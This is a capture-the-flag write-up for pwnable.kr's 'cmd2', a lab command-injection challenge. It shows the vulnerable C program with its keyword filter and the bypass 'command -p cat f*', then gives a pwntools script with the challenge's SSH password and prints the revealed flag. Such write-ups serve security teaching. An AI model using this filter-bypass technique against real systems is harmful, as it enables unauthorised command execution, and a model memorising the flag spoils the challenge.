# Pwnable.kr: Toddler's Bottle
## cmd2

This is a follow up challenge to the **cmd1** challenge, with a much stronger filter and a wiping of the environment variables. As seen in the source code below, our previous solution for **cmd1** will not work this time since the '/' character is now identified by the filter, but we can still use the same trick of using 'f*' to direct to the flag file.

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int filter(char* cmd){
	int r=0;
	r += strstr(cmd, "=")!=0;
	r += strstr(cmd, "PATH")!=0;
	r += strstr(cmd, "export")!=0;
	r += strstr(cmd, "/")!=0;
	r += strstr(cmd, "`")!=0;
	r += strstr(cmd, "flag")!=0;
	return r;
}

extern char** environ;
void delete_env(){
	char** p;
	for(p=environ; *p; p++)	memset(*p, 0, strlen(*p));
}

int main(int argc, char* argv[], char** envp){
	delete_env();
	putenv("PATH=/no_command_execution_until_you_become_a_hacker");
	if(filter(argv[1])) return 0;
	system( argv[1] );
	return 0;
}
```

The question now is how can we run the *cat* utility without using any '/' characters, or find an alternative way to view the flag. Well the *system( argv[1] )* call will be the point that we would need to exploit, and since it is a wrapper for other POSIX exec functions we should have a look at how it works by running *man system*. This shows us that the *system(char * command)* call is a wrapper for *execl("/bin/sh", "sh", "-c", command, (char *) 0)*, which tells us that we are using the dash command line interpreter (AKA shell). Lets look into what already comes builtin with the shell that we have access too by reading the *man sh* page. Of particular interest to us is the builtin in *command* command (sounds a bit confusing), which has the -p option for using a PATH variable that "guarantees to find all the standard utilities".

<pre>
command [-p] [-v] [-V] command [arg ...]
       Execute the specified command but ignore shell functions when searching for it.  (This
       is useful when you have a shell function with the same name as a builtin command.)

       <b>-p     search for command using a PATH that guarantees to find all the standard utili‐
              ties.</b>

       -V     Do not execute the command but search for the command and print the resolution
              of the command search.  This is the same as the type builtin.

       -v     Do not execute the command but search for the command and print the absolute
              pathname of utilities, the name for builtins or the expansion of aliases.
</pre>

Therefore, we can use *command -p cat f** to bypass the changing of the PATH environment variable since *cat* is a standard utility.

Once again, we can write a neat petite script to pwn this challenge.

```python
from pwn import *

s = ssh(host='pwnable.kr', port=2222, user='cmd2', password='mommy now I get what PATH environment is for :)')
p = s.process(["./cmd2", "command -p cat f*"])

#Need to receive 2 lines since 'command' echoes the command to stdout
print(p.recvline())
print(p.recvline())
```

<pre>
[+] Connecting to pwnable.kr on port 2222: Done
[*] cmd1@pwnable.kr:
    Distro    Ubuntu 16.04
    OS:       linux
    Arch:     amd64
    Version:  4.4.179
    ASLR:     Enabled
[+] Starting remote process './cmd2' on pwnable.kr: pid 108150
command -p cat f*

FuN_w1th_5h3ll_v4riabl3s_haha
</pre>
